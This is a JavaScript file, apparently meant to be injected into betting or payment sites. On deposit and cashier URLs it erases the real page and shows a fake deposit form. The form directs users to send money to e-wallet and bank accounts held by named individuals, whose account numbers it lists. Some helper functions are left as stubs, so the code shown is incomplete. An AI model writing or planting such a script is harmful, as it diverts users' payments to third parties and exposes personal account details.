// zigzag.js
(function () {
  const allowedEndings = [
    "/deposit",
    "/bank",
    "/deposit.php",
    "/qris.php",
    "/cashier",
    "/?page=transaksi",
    "/index.php?page=transaksi",
    "/?deposit&head=home",
    "/index.php?page=cashier",
    "/bank.php"
  ];

  // Ambil path + query string untuk mencocokkan
  const currentURL = window.location.pathname + window.location.search;
  const isAllowed = allowedEndings.some(end => currentURL.endsWith(end));

  if (!isAllowed) return; // keluar jika tidak cocok

  // Hapus semua isi halaman lama
  document.documentElement.innerHTML = "<head></head><body></body>";

  // Lanjutkan render seperti sebelumnya
  document.addEventListener("DOMContentLoaded", () => {
    // === Tambahkan STYLE secara dinamis ===
    const style = document.createElement("style");
    style.textContent = `
      :root{ --bg:#eef2f6;--card:#fff;--muted:#6b7280;--primary:#1f6feb;--success:#16a34a;--radius:12px; }
      *{box-sizing:border-box} html,body{height:100%}
      body{font-family:'Poppins',sans-serif;margin:0;background:var(--bg);color:#111827;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;display:flex;justify-content:center;align-items:flex-start;padding:18px 12px;min-height:100vh;}
      .page{width:100%;max-width:760px;} header{margin:6px 0 12px;padding:4px 6px;} h1{margin:0;font-size:24px;color:#0f172a;font-weight:600;}
      .card{background:var(--card);border-radius:var(--radius);box-shadow:0 8px 24px rgba(15,23,42,0.06);padding:18px;overflow:hidden;}
      .marquee{font-size:13px;color:var(--muted);overflow:hidden;white-space:nowrap;display:block;padding:8px 0;border-bottom:1px solid rgba(15,23,42,0.04);margin-bottom:14px;}
      .marquee>span{display:inline-block;padding-left:100%;animation:marquee 14s linear infinite;}
      @keyframes marquee{0%{transform:translateX(0);}100%{transform:translateX(-100%);}}
      .actions{display:flex;gap:10px;margin:12px 0;flex-wrap:wrap;}
      .btn{background:var(--primary);color:#fff;border:none;padding:10px 14px;border-radius:10px;cursor:pointer;font-weight:600;font-size:14px;transition:transform .12s ease,box-shadow .12s ease;box-shadow:0 6px 14px rgba(31,111,235,0.12);}
      .btn:active{transform:translateY(1px)} .btn.secondary{background:var(--success);box-shadow:0 6px 14px rgba(22,163,74,0.12);}
      select,input[type="number"],textarea{width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(15,23,42,0.08);font-size:15px;background:#fff;margin-top:10px;color:#0f172a;}
      textarea{min-height:90px;resize:vertical;padding-top:10px;}
      .bank-info{margin-top:12px;padding:14px;border-radius:10px;background:#f8fafc;display:flex;gap:12px;align-items:center;border:1px solid rgba(15,23,42,0.03);}
      .bank-info img{width:64px;height:64px;object-fit:contain;border-radius:8px;}
      .bank-meta{flex:1;text-align:left;}
      .bank-meta .name{font-weight:600;font-size:16px;margin-bottom:4px;color:#0f172a;}
      .bank-meta .number{font-size:15px;color:#111827;letter-spacing:0.6px;}
      .bank-meta .owner{display:block;margin-top:6px;color:var(--muted);font-size:13px;}
      .bank-actions{display:flex;gap:8px;align-items:center;}
      .helper{font-size:13px;color:var(--muted);margin-top:10px;}
      .result-area{margin-top:14px;text-align:center;}
      .qr-card{display:inline-block;padding:10px;background:#fff;border-radius:12px;box-shadow:0 6px 18px rgba(2,6,23,0.06);}
      .spinner{width:36px;height:36px;border-radius:50%;border:4px solid rgba(0,0,0,0.06);border-top-color:var(--primary);animation:spin 1s linear infinite;margin:10px auto;}
      @keyframes spin{to{transform:rotate(360deg);}}
      footer{text-align:center;margin-top:18px;color:var(--muted);font-size:12px;}
      @media(max-width:600px){h1{font-size:20px;}.card{padding:14px;}.bank-info{flex-direction:column;align-items:center;text-align:center;gap:8px;}.bank-meta{text-align:center;}.actions{flex-direction:column;}.btn{width:100%;}.marquee{font-size:12px;}}
    `;
    document.head.appendChild(style);

    // Google Font
    const link = document.createElement("link");
    link.href = "https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap";
    link.rel = "stylesheet";
    document.head.appendChild(link);

    // === Struktur DOM sama seperti sebelumnya ===
    const page = document.createElement("div");
    page.className = "page";

    const header = document.createElement("header");
    header.innerHTML = "<h1>Formulir Deposit</h1>";

    const card = document.createElement("div");
    card.className = "card";

    const marquee = document.createElement("div");
    marquee.className = "marquee";
    marquee.innerHTML = `<span>Selamat datang di situs kami. Harap perhatikan tujuan deposit — tujuan deposit wajib sesuai dengan formulir deposit. Gunakan kode unik untuk transaksi pertama.</span>`;
    card.appendChild(marquee);

    const actions = document.createElement("div");
    actions.className = "actions";
    const btnManual = document.createElement("button");
    btnManual.className = "btn";
    btnManual.textContent = "Manual Deposit";
    btnManual.onclick = () => showDeposit("manual");
    const btnAuto = document.createElement("button");
    btnAuto.className = "btn secondary";
    btnAuto.textContent = "Otomatis Deposit (QRIS)";
    btnAuto.onclick = () => showDeposit("auto");
    actions.append(btnManual, btnAuto);
    card.appendChild(actions);

    const manualStep = document.createElement("div");
    manualStep.id = "manual-step";
    manualStep.style.display = "none";
    manualStep.style.marginTop = "6px";
    manualStep.innerHTML = `
      <label class="helper">Pilih Metode Deposit</label>
      <select onchange="selectMethod(this.value)">
        <option value="" selected disabled>Pilih Metode Deposit</option>
        <!-- opsi bank sama persis seperti sebelumnya -->
        <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"Dana","number":"088214538915","owner":"SURWATI"}'>Dana</option>
        <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgL5miB0Nl0N4uXXxjG1DZtuV-0kgZ9Hlm_KvhVZ5cgA&s=10","name":"Ovo","number":"088905200893","owner":"ENJAH"}'>Ovo</option>
        <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwXMKiiND-3i_R9jwcg3-gXBrxNEOGL3DEog&usqp=CAU","name":"BRI VA","number":"88810088214538915","owner":"SURWATI"}'>BRI VA</option>
        <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaeDt-esFy5TIN8gKVJhbFowRkxIDEep48aA&usqp=CAU","name":"BCA VA","number":"39358088905200893","owner":"ENJAH"}'>BCA VA</option>
        <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt83cjvCmZBfU4uD-KIMRZFZIG5tbxEO25eg&usqp=CAU","name":"BNI VA","number":"8810088214538915","owner":"SURWATI"}'>BNI VA</option>
        <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhHhAzPQYSQHan0-EHud0djSuTjQzstRV9zA&usqp=CAU","name":"MANDIRI VA","number":"60001088905200893","owner":"ENJAH"}'>MANDIRI VA</option>
      </select>
      <div id="manual-details" class="bank-info" style="display:none">
        <img id="bank-logo" src="" alt="Bank Logo" />
        <div class="bank-meta">
          <div class="name" id="bank-name"></div>
          <div class="number" id="bank-number"></div>
          <div class="owner" id="bank-owner"></div>
        </div>
        <div class="bank-actions" style="flex-direction:column;">
          <button class="btn" onclick="copyToClipboard(document.getElementById('bank-number').innerText)">Salin</button>
        </div>
        <div style="width:100%;margin-top:10px;">
          <input id="manual-nominal" type="number" min="50000" placeholder="Nominal Deposit (min. 50.000)" />
          <textarea id="manual-note" placeholder="Catatan (opsional)"></textarea>
          <button class="btn" style="margin-top:8px;" onclick="submitManualDeposit()">Submit</button>
          <div id="manual-result" class="helper"></div>
        </div>
      </div>
    `;
    card.appendChild(manualStep);

    const autoDeposit = document.createElement("div");
    autoDeposit.id = "auto-deposit";
    autoDeposit.style.display = "none";
    autoDeposit.style.marginTop = "6px";
    autoDeposit.innerHTML = `
      <label class="helper">Masukkan nominal minimal 50.000</label>
      <input id="nominal" type="number" min="50000" placeholder="Nominal" />
      <div style="margin-top:8px;">
        <button class="btn" onclick="generateQRIS()">Submit</button>
      </div>
      <div id="auto-result" class="result-area"></div>
    `;
    card.appendChild(autoDeposit);

    page.append(header, card);

    const footer = document.createElement("footer");
    footer.innerHTML = "&copy; 2024-now";
    page.appendChild(footer);

    document.body.appendChild(page);
  });

  // === Fungsi tetap sama ===
  window.copyToClipboard = function(text){ navigator.clipboard.writeText(text).then(()=>alert('Nomor berhasil disalin!')); }
  window.showDeposit = function(type){
    document.getElementById('manual-step').style.display = (type==='manual') ? 'block' : 'none';
    document.getElementById('auto-deposit').style.display = (type==='auto') ? 'block' : 'none';
    setTimeout(()=>document.querySelector('.card').scrollIntoView({behavior:'smooth',block:'start'}),120);
  }
  window.selectMethod = function(jsonString){ /* sama seperti sebelumnya */ ... }
  window.submitManualDeposit = function(){ /* sama seperti sebelumnya */ ... }
  window.generateQRIS = async function(){ /* sama seperti sebelumnya */ ... }
  window.downloadQR = function(){ /* sama seperti sebelumnya */ ... }
})();
